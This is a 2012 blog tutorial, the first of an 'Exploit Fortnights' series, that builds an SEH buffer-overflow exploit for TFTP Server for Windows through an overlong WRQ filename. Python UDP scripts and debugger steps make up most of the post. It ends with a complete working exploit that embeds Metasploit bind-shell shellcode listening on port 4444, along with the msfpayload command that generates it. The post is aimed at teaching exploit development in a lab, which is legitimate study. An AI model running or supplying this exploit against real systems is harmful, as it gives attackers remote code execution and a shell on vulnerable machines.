---
layout: post
title: 'Exploit Fortnights #1: TFTP Server Filename Overflow'
date: '2012-11-22T14:46:00.003-08:00'
author: thetekwizz
tags: 
modified_time: '2012-11-22T14:46:53.453-08:00'
thumbnail: http://4.bp.blogspot.com/-FFDo0FUIvFI/UK5U9M76qCI/AAAAAAAAAEc/HGg8udoXlRk/s72-c/Selection_017.png
blogger_id: tag:blogger.com,1999:blog-1094392735627525300.post-3420665767943104418
blogger_orig_url: https://tekwizz123.blogspot.com/2012/11/exploit-fortnights-1-tftp-server.html
---

<h2 style="text-align: center;">Exploit Fortnights #1: TFTP Server Filename Overflow</h2><br />Welcome to Exploit Fortnights issue #1. Today I'm going to do an exploit on TFTP Server for Windows which has been exploited numerous times in the past and has many many holes in it. The specific hole that we will be looking at today is a vulnerability when supplying an overly long filename to the WRQ command (more can be found at&nbsp;<a href="http://www.metasploit.com/modules/exploit/windows/tftp/tftpserver_wrq_bof">http://www.metasploit.com/modules/exploit/windows/tftp/tftpserver_wrq_bof</a>). Due to a problem in the way that the program handles this filename, we can achieve arbitrary code execution on the&nbsp;victim&nbsp;machine.<br /><br />The code that we will be basing this exploit off of can be found on exploit-db.com at&nbsp;<a href="http://www.exploit-db.com/exploits/5314/">http://www.exploit-db.com/exploits/5314/</a><br /><br />For those of you wanting the vid.... well here you go... (sorry that the sound keeps on going on....not sure why it does this):<br /><br /><div class="separator" style="clear: both; text-align: center;"><object class="BLOG_video_class" contentid="197522cc21e72eb9" height="266" id="BLOG_video-197522cc21e72eb9" width="320"></object></div><br /><br />Anyway as before, here is what you will need for this tutorial.<br /><br /><h3>Required</h3><div><ul><li>Some version of Windows (I use Windows XP SP3)</li><li>Knowledge of SEH exploits.</li><li>Immunity Debugger installed on the Windows machine</li><li>Mona.py installed within Immunity Debugger</li><li>The ability to stay awake.</li><li>Thats really it....no joke....</li><li>Oh....and the software I mentioned above of course ;)</li></ul><div><br /></div></div><h3>Steps (taken from my notes)</h3><div><ol><li>Look up UDP python sockets&nbsp;</li><li>Make exploit with 2000 "A"</li><li>Replace "A" s with metasploit pattern</li><li>Found that EDX is overwritten 1522 bytes in</li><li>Found ECX is overwritten 1526 bytes in</li><li>Found NSEH is overwritten 1492 bytes in</li><li>Configure Immunity Debugger to start the program with the -v argument (so it would start properly)</li><li>Restructure the exploit to overwrite NSEH and SEH with specific values to check offsets and confirm that these are correct.</li><li>Use 0x7C80DFEC as a POP POP RET for NSEH</li><li>Find this doesn't work</li><li>Replace this with 00410EC0 from TFTPServ, find this works.</li><li>Replace SEH with \xeb\x80\x90\x90. This will effectively jump us back 7E or 126 bytes back.</li><li>Manually make some instructions to set up our jump back again to the beginning of our shellcode by doing *</li><li>Set up a NOP padding for the shellcode (even though we land directly at the beginning of the shellcode exactly I still like a NOP buffer just in case something out of the ordinary happens)</li><li>Make our shellcode and put it into our exploit.</li></ol><div><br /></div><div>Well thats roughly how it SHOULD work. But there is one other thing you will see further along that will prevent this from working normally. See if you can't figure it out ;)</div><div><br /></div></div><div><u>Our Base Exploit</u></div><div><br /></div><div><blockquote>import socket<br />host = "127.0.0.1"<br />port = 69<br />filename = "\x41" * 2000<br />mode = "netascii"<br />data = "\x00\x02" + filename &nbsp;+ "\0" + mode + "\0"<br />handler = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)<br />handler.sendto(data, (host,port))</blockquote>Some things to note here are that we use the SOCK_DGRAM for UDP mode in this case. Also we use handler.sendto rather than handler.send. Again these are differences in using UDP in Python compared to TCP.<br /><br />\0/ Yay networking. Now that&nbsp;that's&nbsp;sorted out lets try testing things out.<br /><br /><u>Our first test</u><br /><br />First though we need to make sure we load the program and specify the -v option as a parameter or else the program won't run correctly.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-FFDo0FUIvFI/UK5U9M76qCI/AAAAAAAAAEc/HGg8udoXlRk/s1600/Selection_017.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="281" src="http://4.bp.blogspot.com/-FFDo0FUIvFI/UK5U9M76qCI/AAAAAAAAAEc/HGg8udoXlRk/s400/Selection_017.png" width="400" /></a></div><br /><br />And now we have our server started:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-oOf_aGjjJjk/UK5VzIa6bFI/AAAAAAAAAEk/LK4Jyv3lMIM/s1600/Selection_020.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="200" src="http://1.bp.blogspot.com/-oOf_aGjjJjk/UK5VzIa6bFI/AAAAAAAAAEk/LK4Jyv3lMIM/s400/Selection_020.png" width="400" /></a></div><br /></div>Lets send the exploit:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-f6PFNGeoleU/UK5WYE2uKQI/AAAAAAAAAEs/8RoBbC6Yb3Q/s1600/Windows+XP+Professional+SP2+-+VMware+Player+(Non-commercial+use+only)_021.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="217" src="http://4.bp.blogspot.com/-f6PFNGeoleU/UK5WYE2uKQI/AAAAAAAAAEs/8RoBbC6Yb3Q/s400/Windows+XP+Professional+SP2+-+VMware+Player+(Non-commercial+use+only)_021.png" width="400" /></a></div><br />Ok so we get an access violation when writing to 0x00230000. Looking at our registers we notice the following:<br /><br /><ul><li>ECX appears to be overwritten with some of our A's.</li><li>The stack appears to point to multiple different sections within our A's.</li></ul><div>More importantly if we look at the SEH chain we see the following:</div><div><br /></div><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-LiHSL4gfT_A/UK5Xd9wZnZI/AAAAAAAAAE0/LfIXN3Wwbko/s1600/Selection_022.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="182" src="http://1.bp.blogspot.com/-LiHSL4gfT_A/UK5Xd9wZnZI/AAAAAAAAAE0/LfIXN3Wwbko/s400/Selection_022.png" width="400" /></a></div><div><br /></div><div>So we also seem to have overwritten our SEH handler.<br /><br /><u>Pattern Time!</u><br /><u><br /></u>Next we do a !mona pc 2000 to generate our metasploit pattern of 2000 characters and replace our A's in the original exploit with this:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-ZpgiQdYMrTQ/UK5ZrFFVHCI/AAAAAAAAAE8/SOqhTXg1_Qo/s1600/Selection_023.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="108" src="http://1.bp.blogspot.com/-ZpgiQdYMrTQ/UK5ZrFFVHCI/AAAAAAAAAE8/SOqhTXg1_Qo/s400/Selection_023.png" width="400" /></a></div><br />And the resulting crash:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-277BglovLyc/UK5ZzfUkfsI/AAAAAAAAAFE/0p7sEHs2Lkc/s1600/Windows+XP+Professional+SP2+-+VMware+Player+(Non-commercial+use+only)_024.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="217" src="http://2.bp.blogspot.com/-277BglovLyc/UK5ZzfUkfsI/AAAAAAAAAFE/0p7sEHs2Lkc/s400/Windows+XP+Professional+SP2+-+VMware+Player+(Non-commercial+use+only)_024.png" width="400" /></a></div><br /><br />As show in the previous tutorial we then try to find the offsets. We do this by running:<br /><br /><blockquote class="tr_bq">!mona findmsp</blockquote><br />And the results should be similar to the following below:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-ikU6y43TroY/UK5cH9L1rMI/AAAAAAAAAFM/Rb_jEk3VNSM/s1600/Selection_025.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="145" src="http://2.bp.blogspot.com/-ikU6y43TroY/UK5cH9L1rMI/AAAAAAAAAFM/Rb_jEk3VNSM/s400/Selection_025.png" width="400" /></a></div><br />&nbsp;The from this the important things that we gather are:<br /><br /><ul><li>NSEH is overwritten 1492 bytes in.</li><li>EDX is overwritten 1522 bytes in.</li><li>ECX is overwritten 1526 bytes in.</li></ul><div><br /></div><div><u>Restructuring the Exploit</u></div><div><br /></div><div>After taking all this into account we make a new exploit as follows:</div><div><br /></div><div><blockquote>import socket&nbsp;</blockquote><blockquote>host = "127.0.0.1"<br />port = 69&nbsp;</blockquote><blockquote>filename = "A" * 1492<br />filename += "B" * 4 # NSEH overwrite<br />filename += "C" * 4 # SEH overwrite&nbsp;</blockquote><blockquote>mode = "netascii"&nbsp;</blockquote><blockquote>data = "\x00\x02" + filename + "\0" + mode + "\0"&nbsp;</blockquote><blockquote>handler = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)<br />handler.sendto(data, (host,port))</blockquote><br />We then send the new exploit and get the following in the SEH chain.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-bwsMn_u4X28/UK5eYdJd_lI/AAAAAAAAAFc/Xuh79o4Ato8/s1600/Selection_026.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="183" src="http://4.bp.blogspot.com/-bwsMn_u4X28/UK5eYdJd_lI/AAAAAAAAAFc/Xuh79o4Ato8/s400/Selection_026.png" width="400" /></a></div><br />If we right click on the first entry and select "Follow Address in Stack" we see the following:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-KLYL48A-1wc/UK5hO11cCfI/AAAAAAAAAFs/woaBdH8NeDA/s1600/Selection_028.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="115" src="http://4.bp.blogspot.com/-KLYL48A-1wc/UK5hO11cCfI/AAAAAAAAAFs/woaBdH8NeDA/s400/Selection_028.png" width="400" /></a></div><br />So we have successfully controlled the NSEH and SEH :). We are on our way to making a working exploit.<br /><br /><u>Configuring SEH with the Right Information</u><br /><u><br /></u>Ok so next we need to find out the right POP POP RET to use for our SEH exploit. We shall use mona for this again and execute the following:<br /><br /><blockquote class="tr_bq">!mona seh</blockquote><br />You should get something like the following:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-2l2YPGbXPAY/UK5ymbOWW3I/AAAAAAAAAF8/TTH3mxf6VQA/s1600/Selection_029.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="125" src="http://1.bp.blogspot.com/-2l2YPGbXPAY/UK5ymbOWW3I/AAAAAAAAAF8/TTH3mxf6VQA/s400/Selection_029.png" width="400" /></a></div><br />You can also open the SEH.txt file (Most likely under C:\Program Files\Immunity Inc\ Immunity Debugger\seh.txt)<br /><br />You can use any of the ones listed that start with a 00. I chose to use the first one listed out of simplicity.<br /><br />Replace the SEH value with the new one and exploit once again:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-LVHqHM63-b4/UK564_REGnI/AAAAAAAAAGM/WkjmcdPq6Z8/s1600/Selection_030.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="132" src="http://1.bp.blogspot.com/-LVHqHM63-b4/UK564_REGnI/AAAAAAAAAGM/WkjmcdPq6Z8/s400/Selection_030.png" width="400" /></a></div><br />&nbsp;Yay :) We got the SEH handler under control now. Lets check this:<br /><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-gqxcHcph1WE/UK565m4wc8I/AAAAAAAAAGQ/eY3nUa2oVbI/s1600/Selection_031.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="225" src="http://3.bp.blogspot.com/-gqxcHcph1WE/UK565m4wc8I/AAAAAAAAAGQ/eY3nUa2oVbI/s400/Selection_031.png" width="400" /></a></div><br />Yep that looks right. So where does that take us then?<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-3cVeV4PdLYc/UK566InEhVI/AAAAAAAAAGU/D1yhq4GjMd0/s1600/Selection_032.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="321" src="http://2.bp.blogspot.com/-3cVeV4PdLYc/UK566InEhVI/AAAAAAAAAGU/D1yhq4GjMd0/s640/Selection_032.png" width="640" /></a></div><br /><br />Oh great balls of fire....that doesn't look nice. It appears that the B's that we are still using for our exploit as the NSEH&nbsp;overwrite&nbsp;are where the program is pointing to now. Now this wouldn't normally be a problem but as you can see in the screenshot above we can't jump to anything below as that would run into a new segment of memory the program doesn't have access to.<br /><br /><u>The First Stage...How do I Jump Backwards again???</u><br /><u><br /></u>So after playing around I found that we still have tons of space above where we are now. To verify this double click on the first B that we have, where the program is currently pointing. You should see an arrow appear:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-LsuSt8E8Gsk/UK58rfWezdI/AAAAAAAAAGk/i22Ucpti9p0/s1600/Windows+XP+Professional+SP2+-+VMware+Player+(Non-commercial+use+only)_033.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="348" src="http://2.bp.blogspot.com/-LsuSt8E8Gsk/UK58rfWezdI/AAAAAAAAAGk/i22Ucpti9p0/s640/Windows+XP+Professional+SP2+-+VMware+Player+(Non-commercial+use+only)_033.png" width="640" /></a></div><br /><br />Scroll up till you see the beginning of your \x41's.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-7WjFjwezJR4/UK59pScZkEI/AAAAAAAAAGs/CwqyHSLcjXM/s1600/Windows+XP+Professional+SP2+-+VMware+Player+(Non-commercial+use+only)_034.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="348" src="http://4.bp.blogspot.com/-7WjFjwezJR4/UK59pScZkEI/AAAAAAAAAGs/CwqyHSLcjXM/s640/Windows+XP+Professional+SP2+-+VMware+Player+(Non-commercial+use+only)_034.png" width="640" /></a></div><br />We see that it is 5D4 bytes till the beginning of our \x41's or 1492 bytes. We decide to do a jump backwards to the beginning of our buffer. The farthest backwards jump we can do is \xeb\x80\x90\x90.<br /><br />So now we will have it so that NSEH looks like this:<br /><blockquote class="tr_bq">nseh = "\xeb\x80\x90\x90"</blockquote>Except&nbsp;just put that in for the part in the code where NSEH is overwritten (well that minus the nseh = part).<br /><br /><u>Testing it Out Again</u><br /><u><br /></u>Ok with those changes our code looks like this:<br /><br /><br /><blockquote>import socket&nbsp;</blockquote><blockquote>host = "127.0.0.1"<br />port = 69&nbsp;</blockquote><blockquote>filename = "A" * 1492<br />filename += "B" * 4 # NSEH overwrite<br />filename += "\x05\x96\x40" # SEH overwrite&nbsp;</blockquote><blockquote>mode = "netascii"&nbsp;</blockquote><blockquote>data = "\x00\x02" + filename + "\0" + mode + "\0"</blockquote><blockquote>handler = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)<br />handler.sendto(data, (host,port))</blockquote><br />Lets test that out:<br /><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-7xcddfBwT5w/UK6D1LHjt5I/AAAAAAAAAHA/GSxpGbU4tSc/s1600/Windows+XP+Professional+SP2+-+VMware+Player+(Non-commercial+use+only)_035.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="348" src="http://1.bp.blogspot.com/-7xcddfBwT5w/UK6D1LHjt5I/AAAAAAAAAHA/GSxpGbU4tSc/s640/Windows+XP+Professional+SP2+-+VMware+Player+(Non-commercial+use+only)_035.png" width="640" /></a></div><br /><div class="separator" style="clear: both; text-align: center;"></div>So we can see we go back 7E or 126 bytes from where we execute our jump (makes sense as we jump 80 bytes but 2 of those are taken up by the actual jump instruction which takes up 2 bytes. Other 2 bytes of the 4 byte overwrite are taken up by our \x90 NOP instructions)<br /><br />Our new exploit taking this in account is as follows:<br /><br /><br /><blockquote>import socket&nbsp;</blockquote><blockquote>host = "127.0.0.1"<br />port = 69&nbsp;</blockquote><blockquote>filename = "A" * (1492-126)<br />filename += "\xCC" * 126<br />filename += "\xeb\x80\x90\x90" # NSEH overwrite<br />filename += "\x05\x96\x40" # SEH overwrite&nbsp;</blockquote><blockquote>mode = "netascii"&nbsp;</blockquote><blockquote>data = "\x00\x02" + filename + "\0" + mode + "\0"&nbsp;</blockquote><blockquote>handler = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)<br />handler.sendto(data, (host,port))</blockquote>Lets check that:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-4AQaZipUEjg/UK6GGBoSO0I/AAAAAAAAAHI/Gl3gHZ1Jczw/s1600/Windows+XP+Professional+SP2+-+VMware+Player+(Non-commercial+use+only)_036.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="348" src="http://4.bp.blogspot.com/-4AQaZipUEjg/UK6GGBoSO0I/AAAAAAAAAHI/Gl3gHZ1Jczw/s640/Windows+XP+Professional+SP2+-+VMware+Player+(Non-commercial+use+only)_036.png" width="640" /></a></div><br /><br /><u><br /></u><u>Aligning&nbsp;EBP</u><br /><u><br /></u>Ok now notice that the register EBP points near to our buffer. Right click on EBP, click "Follow in Stack" and then double click on the first entry. Scroll down a bit and you should notice the following:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-pbg9ss6gq2c/UK6I2Fr3C2I/AAAAAAAAAHU/LdyEjtanx3c/s1600/Selection_037.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="274" src="http://3.bp.blogspot.com/-pbg9ss6gq2c/UK6I2Fr3C2I/AAAAAAAAAHU/LdyEjtanx3c/s640/Selection_037.png" width="640" /></a></div><br />We can increase EBP to get it to point to the beginning of our buffer of \x41's by doing the following:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-YTKrPQ539kM/UK6LJq8czWI/AAAAAAAAAHk/pEGE2HZ2AAk/s1600/Windows+XP+Professional+SP2+-+VMware+Player+(Non-commercial+use+only)_038.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="348" src="http://3.bp.blogspot.com/-YTKrPQ539kM/UK6LJq8czWI/AAAAAAAAAHk/pEGE2HZ2AAk/s640/Windows+XP+Professional+SP2+-+VMware+Player+(Non-commercial+use+only)_038.png" width="640" /></a></div><br />By doing \x83\xC5\x50 15 times over to increase EBP to the right and then doing \xFF\xE5 to execute a JMP EBP, we actually jump directly to the beginning of the buffer.<br /><br />Actually in this picture i would like to point out a few things:<br /><br /><ul><li>If you look in the register menu you can see EBP pointing to our string of A's.</li><li>You can see these A's in the bottom left (btw this is not shown but the next line up is the name of the program so this is literally the first line of A's that we sent.</li></ul><div>Ok so lets try that now.</div><div><br /></div><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-P5W2xs8OhcA/UK6N5x2V7xI/AAAAAAAAAH4/GVjAs2SE28c/s1600/Windows+XP+Professional+SP2+-+VMware+Player+(Non-commercial+use+only)_041.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="348" src="http://1.bp.blogspot.com/-P5W2xs8OhcA/UK6N5x2V7xI/AAAAAAAAAH4/GVjAs2SE28c/s640/Windows+XP+Professional+SP2+-+VMware+Player+(Non-commercial+use+only)_041.png" width="640" /></a></div><div><br /></div><div>:) Seems like we are nearly there. And we are...minus one odd little thing.</div><div><br /></div><div><u>The Odd Byte Error</u></div><div><br /></div><div>If you look in the above screenshot you will see that we have our long string of A's on the left hand side. But if you have been paying attention (or just weren't listening intently to me :P ) you will see that the string of A's are broken up on the line with offset E0 on the left hand side.</div><div><br /></div><div>We see that our A's get turned into 0's at this location. Looking at the rest of our buffer we see that this is the only location that this happens.</div><div><br /></div><div>Ok so lets see how far this is from the beginning from beginning of the beginning of buffer so we can adjust for this.</div><div><br /></div><div>Well atm the arrow points to the beginning of our buffer and counting along the line we see it is the 8th byte in the line. Considering the first byte is E0, we can say that E7 is the first NULL byte.</div><div><br /></div><div>E7 in decimal is 231 bytes. So after 230 bytes we get a 4 byte space of nulls. So if we prepend 230 bytes of junk before our set of As we should be able to deal with this problem.</div><div><br /></div><div>Well thats not entirely right. It seems I was two bytes off from the start of the 0's. Lets up our \x90's by 6 (2 for the 2 bytes and then another 4 to cover the null byte space). So we will use 236 bytes of junk instead.</div><div><br /></div><div><div>import socket</div><div><br /></div><div>host = "127.0.0.1"</div><div>port = 69</div><div><br /></div><div>filename = "\x90" * 236</div><div>filename += "A" * (1492-126-236) # 126 for the space that we jump to. 236 for the space up to and including the 4 byte null space.</div><div>filename += "\x83\xC5\x50" * 15</div><div>filename += "\xFF\xE5"</div><div>filename += "\xCC" * ( 126 - ((15 * 3) + 2) )</div><div>filename += "\xeb\x80\x90\x90" # NSEH overwrite</div><div>filename += "\x05\x96\x40" # SEH overwrite</div><div><br /></div><div>mode = "netascii"</div><div><br /></div><div>data = "\x00\x02" + filename + "\0" + mode + "\0"</div><div><br /></div><div>handler = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</div><div>handler.sendto(data, (host,port))</div></div><div><br /></div><div><br /></div><div><br /></div><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-1qy_IN3791Q/UK6UV6acVTI/AAAAAAAAAIM/8EEC0Sx8g4Q/s1600/Selection_042.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="326" src="http://2.bp.blogspot.com/-1qy_IN3791Q/UK6UV6acVTI/AAAAAAAAAIM/8EEC0Sx8g4Q/s640/Selection_042.png" width="640" /></a></div><div><br /></div><div>Ok so now we have solved that issue. However two problems remain:</div><div><ul><li>We now have to jump to the beginning of the 41's and not the \x90's at the beginning. Thus we have to increase our EBP some more to point to the \x41's now.</li><li>We need to generate some shellcode baby!</li></ul><div><br /></div></div><div><u>Adjusting Our Registers......Again</u></div><div><br /></div><div>Ok so after a bit of playing around we find that we need add another 3 copies of our ADD EBP, 50 set of instructions to our exploit. I tried doing it via the regular method of looking at the offsets manually but I found I was 2 sets off:</div><div><br /></div><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-777Htik5UA4/UK6X7ToRbSI/AAAAAAAAAIg/9d-ja9oKs2E/s1600/Windows+XP+Professional+SP2+-+VMware+Player+(Non-commercial+use+only)_044.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="348" src="http://1.bp.blogspot.com/-777Htik5UA4/UK6X7ToRbSI/AAAAAAAAAIg/9d-ja9oKs2E/s640/Windows+XP+Professional+SP2+-+VMware+Player+(Non-commercial+use+only)_044.png" width="640" /></a></div><div><br /></div><div>So if we use 3 instead this is the code should get:</div><div><br /></div><div><blockquote>import socket&nbsp;</blockquote><blockquote>host = "127.0.0.1"<br />port = 69&nbsp;</blockquote><blockquote>filename = "\x90" * 236<br />filename += "A" * (1492-126-236) # 126 for the space that we jump to. 236 for the space up to and including the 4 byte null space.<br />filename += "\x83\xC5\x50" * 18<br />filename += "\xFF\xE5"<br />filename += "\xCC" * ( 126 - ((18 * 3) + 2) )<br />filename += "\xeb\x80\x90\x90" # NSEH overwrite<br />filename += "\x05\x96\x40" # SEH overwrite&nbsp;</blockquote><blockquote>mode = "netascii"&nbsp;</blockquote><blockquote>data = "\x00\x02" + filename + "\0" + mode + "\0"&nbsp;</blockquote><blockquote>handler = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)<br />handler.sendto(data, (host,port))</blockquote><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-UQ-MsWQuL2U/UK6cYm_l-XI/AAAAAAAAAI0/uL1dbrC6yWY/s1600/Windows+XP+Professional+SP2+-+VMware+Player+(Non-commercial+use+only)_046.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="348" src="http://4.bp.blogspot.com/-UQ-MsWQuL2U/UK6cYm_l-XI/AAAAAAAAAI0/uL1dbrC6yWY/s640/Windows+XP+Professional+SP2+-+VMware+Player+(Non-commercial+use+only)_046.png" width="640" /></a></div><br /><br /><u>Shellcode Time!</u><br /><u><br /></u>We then generate some shellcode:<br /><br /><br /><blockquote class="tr_bq">msfpayload windows/shell/bind_tcp R | msfencode -a x86 -b "\x00\x2f" -t c</blockquote><br />And stick it in there and add some NOPS before it. Then adjust our amount of A's to accomidate for the nop slide and the shellcode and you should get the following:<br /><br /><br /><blockquote class="tr_bq">import socket</blockquote><blockquote class="tr_bq">host = "127.0.0.1"<br />port = 69&nbsp;</blockquote><blockquote class="tr_bq">nopSlide = "\x90" * 20&nbsp;</blockquote><blockquote class="tr_bq"># bind_tcp metasploit shellcode on port 4444<br /># 325 bytes<br /># bad chars = \x00 \x2f<br />shellcode = ("\xbe\xb9\xdb\x0e\x9c\xdb\xd1\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"<br />"\x56\x31\x72\x13\x83\xc2\x04\x03\x72\xb6\x39\xfb\x60\x20\x34"<br />"\x04\x99\xb0\x27\x8c\x7c\x81\x75\xea\xf5\xb3\x49\x78\x5b\x3f"<br />"\x21\x2c\x48\xb4\x47\xf9\x7f\x7d\xed\xdf\x4e\x7e\xc3\xdf\x1d"<br />"\xbc\x45\x9c\x5f\x90\xa5\x9d\xaf\xe5\xa4\xda\xd2\x05\xf4\xb3"<br />"\x99\xb7\xe9\xb0\xdc\x0b\x0b\x17\x6b\x33\x73\x12\xac\xc7\xc9"<br />"\x1d\xfd\x77\x45\x55\xe5\xfc\x01\x46\x14\xd1\x51\xba\x5f\x5e"<br />"\xa1\x48\x5e\xb6\xfb\xb1\x50\xf6\x50\x8c\x5c\xfb\xa9\xc8\x5b"<br />"\xe3\xdf\x22\x98\x9e\xe7\xf0\xe2\x44\x6d\xe5\x45\x0f\xd5\xcd"<br />"\x74\xdc\x80\x86\x7b\xa9\xc7\xc1\x9f\x2c\x0b\x7a\x9b\xa5\xaa"<br />"\xad\x2d\xfd\x88\x69\x75\xa6\xb1\x28\xd3\x09\xcd\x2b\xbb\xf6"<br />"\x6b\x27\x2e\xe3\x0a\x6a\x27\xc0\x20\x95\xb7\x4e\x32\xe6\x85"<br />"\xd1\xe8\x60\xa6\x9a\x36\x76\xc9\xb1\x8f\xe8\x34\x39\xf0\x21"<br />"\xf3\x6d\xa0\x59\xd2\x0d\x2b\x9a\xdb\xd8\xfc\xca\x73\xb2\xbc"<br />"\xba\x33\x62\x55\xd1\xbb\x5d\x45\xda\x11\xe8\x41\x14\x41\xb9"<br />"\x25\x55\x75\x2c\xea\xd0\x93\x24\x02\xb5\x0c\xd0\xe0\xe2\x84"<br />"\x47\x1a\xc1\xb8\xd0\x8c\x5d\xd7\xe6\xb3\x5d\xfd\x45\x1f\xf5"<br />"\x96\x1d\x73\xc2\x87\x22\x5e\x62\xc1\x1b\x09\xf8\xbf\xee\xab"<br />"\xfd\x95\x98\x48\x6f\x72\x58\x06\x8c\x2d\x0f\x4f\x62\x24\xc5"<br />"\x7d\xdd\x9e\xfb\x7f\xbb\xd9\xbf\x5b\x78\xe7\x3e\x29\xc4\xc3"<br />"\x50\xf7\xc5\x4f\x04\xa7\x93\x19\xf2\x01\x4a\xe8\xac\xdb\x21"<br />"\xa2\x38\x9d\x09\x75\x3e\xa2\x47\x03\xde\x13\x3e\x52\xe1\x9c"<br />"\xd6\x52\x9a\xc0\x46\x9c\x71\x41\x76\xd7\xdb\xe0\x1f\xbe\x8e"<br />"\xb0\x7d\x41\x65\xf6\x7b\xc2\x8f\x87\x7f\xda\xfa\x82\xc4\x5c"<br />"\x17\xff\x55\x09\x17\xac\x56\x18")&nbsp;</blockquote><blockquote class="tr_bq">filename = "\x90" * 236<br />filename += nopSlide<br />filename += shellcode<br />filename += "A" * (1492-126-236-len(nopSlide)-len(shellcode)) # 126 for the space that we jump to.&nbsp;</blockquote><blockquote class="tr_bq"># 236 for the space up to and including the 4 byte null space.&nbsp;</blockquote><blockquote class="tr_bq"># 20 bytes for nop slide and 325 bytes for the shellcode.&nbsp;</blockquote><blockquote class="tr_bq">filename += "\x83\xC5\x50" * 18<br />filename += "\xFF\xE5"<br />filename += "\xCC" * ( 126 - ((18 * 3) + 2) )<br />filename += "\xeb\x80\x90\x90" # NSEH overwrite<br />filename += "\x05\x96\x40" # SEH overwrite&nbsp;</blockquote><blockquote class="tr_bq">mode = "netascii"&nbsp;</blockquote><blockquote class="tr_bq">data = "\x00\x02" + filename + "\0" + mode + "\0"&nbsp;</blockquote><blockquote class="tr_bq">handler = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)<br />handler.sendto(data, (host,port))</blockquote><br /><br />We have successfully made our exploit!<br /><br />If you connect to the port using metasploit you should get the following:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-Jr0HKvI0E9c/UK6nzxG6nWI/AAAAAAAAAJI/pYBYtSn0I1Y/s1600/Selection_047.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="304" src="http://2.bp.blogspot.com/-Jr0HKvI0E9c/UK6nzxG6nWI/AAAAAAAAAJI/pYBYtSn0I1Y/s640/Selection_047.png" width="640" /></a></div><br /></div><br /></div></div>